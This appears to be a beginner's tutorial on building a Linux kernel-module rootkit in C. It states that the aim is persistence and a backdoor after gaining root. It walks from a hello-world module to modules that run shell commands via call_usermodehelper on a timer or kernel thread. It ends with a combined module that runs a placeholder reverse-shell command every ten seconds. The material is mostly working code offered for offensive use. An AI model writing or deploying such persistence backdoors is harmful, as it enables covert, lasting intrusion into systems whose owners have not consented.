# Rootkits

## 🧑‍💻Rootkit development

### Requirements

1. A Linux VM for testing our rootkit
2. Linux fundamentals
3. C Programming

### : Why we need Rootkits

After getting root access to a system our main target is to get more persistence so that whenever the system comes online we can get a backdoor again. 

### : Qualities of a good rootkit

A **good rootkit** is **not easy to detect** on the system, And it should keep working **even if the system gets restarted** the rootkit also **should be able to escalate higher privileges.**

### Let’s come to the point learning kernel programming and creating our rootkit is a little complex task and we try to find some resources that are quite hard to understand as a beginner like if you go through a book you may have problems in understanding and you may get frustrated

### To make things simple we’ll start with a few easy examples

### 🔦**LET’S TAKE AN EXAMPLE OF HELLO WORLD**

```jsx
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>

MODULE_AUTHOR("j3rry");
MODULE_DESCRIPTION("A simple program to write hello world");
MODULE_LICENSE("GPL");

static int __init hello(void){
	printk(KERN_INFO "Hello, Everyone!");
	return 0;
}
static void __exit bye(void){
	printk(KERN_INFO "module has been removed");
}
module_init(hello);
module_exit(bye);
```

So before going further you may notice some header files here and may ask that why they seem weird cuz you’ve not seen them before in programs created using the c programming language. that is because we just use a few header files as a beginner like <stdio.h>, <stdlib.h>, <math.h> etc… but there are more libraries that are used in creating kernel programs you can see examples of that header file in example codes here 

**hmm… So let’s have a look at libraries that we will use further in examples or maybe in coding**

1. **`<linux/init.h>`** - contains functions and macros for module initialization and cleanup
2. **`<linux/module.h>`** - contains definitions for the kernel module framework
3. **`<linux/kernel.h>`** - contains definitions for kernel-level functions and macros
4. **`<linux/fs.h>`** - contains definitions for the file system interfaces
5. **`<linux/cdev.h>`** - contains definitions for character device drivers
6. **`<linux/mm.h>`** - contains definitions for memory management functions
7. **`<linux/slab.h>`** - contains definitions for memory allocation functions
8. **`<linux/types.h>`** - contains definitions for various data types
9. **`<linux/list.h>`** - contains definitions for linked list manipulation functions
10. **`<linux/wait.h>`** - contains definitions for wait queue management functions
11. **`<linux/sched.h>`** - contains definitions for scheduling and process management functions
12. **`<linux/device.h>`** - contains definitions for device driver interfaces
13. **`<linux/gpio.h>`** - contains definitions for GPIO pin manipulation functions
14. **`<linux/i2c.h>`** - contains definitions for I2C bus communication functions
15. **`<linux/spi/spi.h>`** - contains definitions for SPI bus communication functions
16. **`<linux/kthread.h>`** - contains definitions for kernel thread management functions
17. **`<linux/time.h>`** - contains definitions for time management functions

### EXPLAINATION

- **This code as you can see prints the "Hello, Everyone!" in kernel logs to run this you can use the Makefile given below I got this from [xcellarator.github.io](http://xcellarator.github.io/)**
- **and then do run "make" command in the directory you've saved your Makefile and kernel program after making the kernel module successfully you can insert it in the kernel by running the following commands**
- **before inserting you may clear kernel logs that are previously created**
- **sudo dmesg -C**
- **sudo insmod filename.ko**
- **sudo insmod filename (without extension)**

## Obviously, we won’t gonna do just hello world stuff we guys are here to create a rootkit that can give you persistence on the system

**__________________________________________________________________________________________________________**

*********************************************************************************************************

## **let’s try to make a kernel program that can execute a few commands on a system**

So, To achieve this task we have to include few header files

```jsx
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>

MODULE_AUTHOR("J3rry");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A kernel program that can execute commands");

int command_executer(void){
        char *cmd_array[] = {"/bin/bash", "-c", "cmd1; cmd2; cmd3; cmdn;", NULL};
        char *env_variable[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
        call_usermodehelper(cmd_array[0], cmd_array, env_variable, UMH_WAIT_EXEC);
        printk(KERN_INFO "All commands has been executed");
        return 0;
}

static int __init init_function(void){
        command_executer();
        printk(KERN_INFO "module inserted successfully");
        return 0;
}
static void __exit exit_function(void){
        printk(KERN_INFO "module removed successfully");
}
module_init(init_function);
module_exit(exit_function);
```

### Explanation ;-)

The above code executes the specified commands on the system. To create this file, a few header files are included:

```jsx
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
```

The command_executer() function executes a set of commands on the system:

```jsx
char *cmd_array[] = {"/bin/bash", "-c", "cmd1; cmd2; cmd3; cmdn;", NULL};
char *env_variable[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
call_usermodehelper(cmd_array[0], cmd_array, env_variable, UMH_WAIT_EXEC);
```

The init_function() and exit_function() functions are used to insert and remove the module.

## But for our rootkit, it should callback us so that we can establish a backdoor connection

for that, we can add a timer to our previously created kernel program like a cronjob does

**firstly let’s create a kernel program that can print a few texts in every fixed time period that we want. We can achieve this task by using <linux/timer.h> header file**

```jsx
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/timer.h>

MODULE_AUTHOR("J3rry");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A kernel program that can print few texts in kernel logs in a certain time period");

static struct timer_list my_timer;//my_timer is a static variable of type struct timer_list
void command_executer(void){
        char *cmd_array[] = {"/bin/bash", "-c", "cmd1; cmd2; cmd3; cmdn;", NULL};
        char *env_variable[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
        call_usermodehelper(cmd_array[0], cmd_array, env_variable, UMH_WAIT_EXEC);
        printk(KERN_INFO "All commands has been executed");
}
void time_callback(struct timer_list *timer){//now we gonna define a callback function that will be called back whe>
        printk(KERN_INFO "hell\n");
				command_executer();
        mod_timer(&my_timer, jiffies + msecs_to_jiffies(30000));//as we know after timer gets over timer_setup call>
                                                                //and that calls the mod_timer() function which ext>
}

static int __init initiate(void){
        printk(KERN_INFO "started\n");
        
        timer_setup(&my_timer, time_callback, 0);//this function initializes the my_timer variable of type struct t>
                                                //it is like we just did the setup to run the timer like the things>
        mod_timer(&my_timer, jiffies + msecs_to_jiffies(30000));//by this function our timer get's started 
        return 0;
}
static void __exit remove(void){
        del_timer(&my_timer);
        printk(KERN_INFO "bye bye");
}

module_init(initiate);
module_exit(remove);
```

## There is one more method available to do this task…

```jsx
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/delay.h>

MODULE_AUTHOR("J3rry");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Another way to write texts in kernel log in a cetain time period");

static struct task_struct *my_thread;

int print_hello (void *data)
{
    while (!kthread_should_stop()) {
        
        printk(KERN_INFO "HELLO\n");
        msleep(10000); //sleep for 10 seconds
    }

    return 0;
}

static int __init initiate(void)
{
    printk(KERN_INFO "started\n");

    my_thread = kthread_create(print_hello, NULL, "my_thread");//here we did create the thread only
    if (IS_ERR(my_thread)) {//if there is any error in creating the thread then print failed
        printk(KERN_ALERT "Failed to create kernel thread\n");
        return -ENOMEM;
    }

    wake_up_process(my_thread);//here we did the process initiate

    return 0;
}

static void __exit remove(void)
{
    kthread_stop(my_thread);
    printk(KERN_INFO "bye bye\n");
}

module_init(initiate);
module_exit(remove);
```

## Now i hope you got the idea that what we’re gonna do we have created a module that can execute some commands and a module that can do timer stuff if we do combine both we can have a backdoor giving us a reverse connection every second

after combining the code the code will look like this

```jsx
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/delay.h>

MODULE_AUTHOR("J3rry");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A kernel program that can execute few commands in certain time period");

static struct task_struct *my_thread;

void command_executer(void){
        char *cmd_array[] = {"/bin/bash", "-c", "put your commands for revshell or for anything else ", NULL};
        char *env_variable[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
        call_usermodehelper(cmd_array[0], cmd_array, env_variable, UMH_WAIT_EXEC);
        printk(KERN_INFO "All commands has been executed");
}
int print_hello (void *data)
{
    while (!kthread_should_stop()) {
        command_executer();
        printk(KERN_INFO "HELLO\n");
        msleep(10000); //sleep for 10 seconds
    }

    return 0;
}

static int __init initiate(void)
{
    printk(KERN_INFO "started\n");

    my_thread = kthread_create(print_hello, NULL, "my_thread");//here we did create the thread only
    if (IS_ERR(my_thread)) {//if there is any error in creating the thread then print failed
        printk(KERN_ALERT "Failed to create kernel thread\n");
        return -ENOMEM;
    }

    wake_up_process(my_thread);//here we did the process initiate

    return 0;
}

static void __exit remove(void)
{
    kthread_stop(my_thread);
    printk(KERN_INFO "bye bye\n");
}

module_init(initiate);
module_exit(remove);
```